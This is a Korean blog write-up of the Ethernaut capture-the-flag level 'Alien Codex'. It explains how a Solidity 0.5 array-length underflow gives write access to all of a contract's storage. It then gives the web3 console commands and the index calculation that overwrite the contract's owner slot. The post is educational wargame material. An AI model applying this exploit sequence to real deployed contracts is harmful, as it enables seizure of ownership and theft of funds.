---
emoji: 🧢
title: (Ethernaut 취약점 19) Alien Codex
date: '2022-02-05 18:15:00'
author: 한성원
tags: ethernaut AlienCodex vulnerability 
categories: 취약점분석
---


# 👋 1. Alien Codex
__Difficulty 7/10__

- 승리 조건
- 코드 분석
- 풀이
순서로 진행 될 것이다.

- - -

## 승리 조건
- Alien contract의 ownership 가져오기

- - -

## 코드 분석
분석은 주석에 있습니다!

```solidity
// 컴파일러 버전 0.5.0을 사용하고 있다. 즉 under & overflow 취약점을 가지고 있다.
pragma solidity ^0.5.0;

// 우리가 모르는 Ownable-05.sol contract를 import한다.
import '../helpers/Ownable-05.sol';

contract AlienCodex is Ownable {

    bool public contact;
    bytes32[] public codex;

    // contact이 true인지 확인하는 modifier
    modifier contacted() {
        assert(contact);
        _;
    }
    
    // contact의 value를 true로 만들 수 있는 function
    function make_contact() public {
        contact = true;
    }

    // codex array에 _content를 push 할 수 있는 function
    // modifier: contacted
    function record(bytes32 _content) contacted public {
        codex.push(_content);
    }

    // codex의 length를 줄일 수 있다. 아마 pop과 같은 역할을 위해 만든게 아닐까 싶다.
    // modifier: contacted
    function retract() contacted public {
        codex.length--;
    }

    // codex array안에 i위치에 있는 _content를 바꿀 수 있다.
    // modifier: contacted
    function revise(uint i, bytes32 _content) contacted public {
        codex[i] = _content;
    }
}
```
- - -

## 풀이
### 들어가기 전
이 문제에서 우리의 목표는 Alien contract의 ownership 가져오는 것이다.

우선 힌트를 보자!
1. array storage가 어떻게 작동하는지 이해해야한다.
2. ABI의 특징을 이해해야한다.
3. Using a very underhanded approach -> 아마 underhanded solidity contest에 관해 말하는 것 같은데... 
그것처럼 풀라는건가? 정확히는 모르겠다. 추후 알게되면 업데이터하도록 하겠다!

우리의 승리 조건은 owner를 가져오는 것이지만 코드를 아무리 둘러봐도 `owner`를 바꿀 수 있는 function은 존재하지 않는다. 하지만 모든 `state variable`은 동인한 `storage`에 저장된다. 만약 우리가 모든 storage에 대한 access를 가진다면 어떻게 될까? 

이 문제는 `codex[]`의 길이를 최대값으로 만든 후 모든 storage에 대한 access를 가진다. 이후 `revise()`를 통해 owner의 위치에 값을 바꿔놓으면 해결할 수 있다.

이 문제를 풀기 위해서는 storage에 대한 지식이 없다면 풀 수 없다. state vaiable들이 어떤 방식으로 저장되는지 알아야한다. 관련해서는 다음 글들을 읽어보고 오길 바란다.
- [(Ethernaut 취약점 12) Privacy](https://holyhansss.github.io/ethernaut/12_privacy_ethernaut/12_privacy_ethernaut/)
- [EVM Storage에는 어떻게 변수가 저장될까? 저수준에서 확인하는 Storage 영역 - Heuristic Wave](https://medium.com/@heuristicwave/evm-storage%EC%97%90%EB%8A%94-%EC%96%B4%EB%96%BB%EA%B2%8C-%EB%B3%80%EC%88%98%EA%B0%80-%EC%A0%80%EC%9E%A5%EB%90%A0%EA%B9%8C-%EC%A0%80%EC%88%98%EC%A4%80%EC%97%90%EC%84%9C-%ED%99%95%EC%9D%B8%ED%95%98%EB%8A%94-storage-%EC%98%81%EC%97%AD-71dc3a6da8e2)

<br/>

### 풀이
먼저 make_contact() 제외하고 모든 function은 contacted modifier를 통과해야한다.
우리는 이 부분은 make_contact()를 call하는 것 만으로도 쉽게 해결할 수 있다.

`retract()`를 보면 codex의 길이를 줄이는 것을 알 수 있다. solidity 컴파일러 버젼 0.5.0은 overflow와 underflow를 throw하지 않는다.

우선 길이를 줄이기 위해서는 codex array의 값을 집어넣어야한다.

```javascript
//  우선 현재 owner를 확인해보자!
await contract.owner()

// make_contact를 통해 contact를 true로 바꾼다.
await contract.make_contact()

// record에 임의의 32 bytes 값을 넣는다.
await contract.record("0x0000000000000000000000000000000000000000000000000000000000000900")

// 이후 contract의 storage slot 0와 1의 값을 확인해보자
// slot 0에는 owner의 주소와 contact의 bool값이 들어있다.
// slot 1에는 codex[]의 길이가 들어있다
await web3.eth.getStorageAt("contract address", 0, function(err, res) {console.log(res)})
await web3.eth.getStorageAt("contract address", 1, function(err, res) {console.log(res)})

// retract()을 사용해 codex의 길이를 2^256-1로 만든다.
await contract.retract()
await contract.retract()
// 다시한번 길이를 확인해보면 '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'가 길이가 된 것을 확인할 수 있다.
await web3.eth.getStorageAt("contract address", 1, function(err, res) {console.log(res)})
```
<br/>

위 코드들을 통해 EVM Storage 전체에 대한 access를 얻었다. 즉 owner를 나 자신으로 바꿀 준비는 끝났다. 이제 owner이 저장되어있는 위치를 찾아 revise 함수를 호출하면 끝난다.

그렇다면 이제 revise()에 인자인 i를 찾아보자.
dynamic array의 경우 사이즈를 예측할 수 없기 때문에 Keccak-256 hash를 사용해 위치를 정한다.
[이 글](https://programtheblockchain.com/posts/2018/03/09/understanding-ethereum-smart-contract-storage/)을 참조하자! <- 진짜 중요함!

dynamic array의 위치는 다음과 같은 수식을 사용해 찾을 수 있다.
`codex[y](y=2**256-x)` x는 slot의 위치이다.
codex array의 storage 위치는 `keccak256(bytes32(1))`이다.

위 수식을 remix에 대입하여 위치를 계산하면 다음과 같다.
```solidity
function arrLocation()
    public
    {
        // codex[y](y=2**256-x)
        index = (2**256-1) - uint256(keccak256(bytes32(1))) + 1; 
    }
```
<br/>

위 함수를 통해 우리는 `35707666377435648211887908874984608119992236509074197713628505308453184860938`라는 값을 얻었고 이는 owner의 storage 위치이다.

마지막으로 다음과 같이 revise를 사용해 owner를 바꿔주면 된다.
```javascript
// 두번째 인자는 32 bytes인 나의 주소이다. 20 bytes인 주소 앞에 0을 붙여주면 된다.
await contract.revise("35707666377435648211887908874984608119992236509074197713628505308453184860938","0x0000000000000000000000000d3D56806fe6eeDe410Ea9722da9a6f65FD24799")

// owner이 잘 바뀐지 확인
await web3.eth.getStorageAt("contract address", 0, function(err, res) {console.log(res)})
```
<br/>


owner가 바뀐것을 확인했다면 ethernaut으로 돌아와 Submit instance를 누르고 조금 기다리면 block이 mine되고, 아래와 같이 뜨며 마무리된다.
```
٩(- ̮̮̃-̃)۶ Well done, You have completed this level!!!
```
- - -

## 마무리
ethernaut은 후반부에 갈수록 배우는 것이 많다고 생각한다. 이 magicNumber와 마찬가지로 이번 문제에서도 EVM에 대해 더 깊이 알 수 있었던 시간이었다. 또한 underhand solidity contest에 대해서도 알게되었다. 이제 ethernaut 문제가 6개 남았는데, 문제를 다 풀고나면 underhand solidity contest문제들도 풀어보며 열심히 배우자 :)

- - -
## REF
- rinkeyb network ether faucet: https://faucets.chain.link/rinkeby
- ethernaut: https://ethernaut.openzeppelin.com/
- remix IDE: https://remix.ethereum.org


```toc

```